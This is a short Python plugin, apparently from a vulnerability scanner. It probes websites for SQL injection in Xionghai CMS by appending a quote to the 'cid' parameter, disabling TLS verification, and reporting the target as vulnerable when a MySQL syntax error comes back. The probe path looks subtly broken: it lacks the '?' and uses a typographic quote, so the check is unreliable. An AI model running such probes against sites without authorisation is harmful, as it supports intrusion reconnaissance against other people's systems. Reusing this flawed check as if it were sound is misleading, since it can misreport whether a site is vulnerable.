#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '熊海CMS SQL注入',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/r=content&cid=16’'
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'You have an error in your SQL syntax.*?near.*?',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret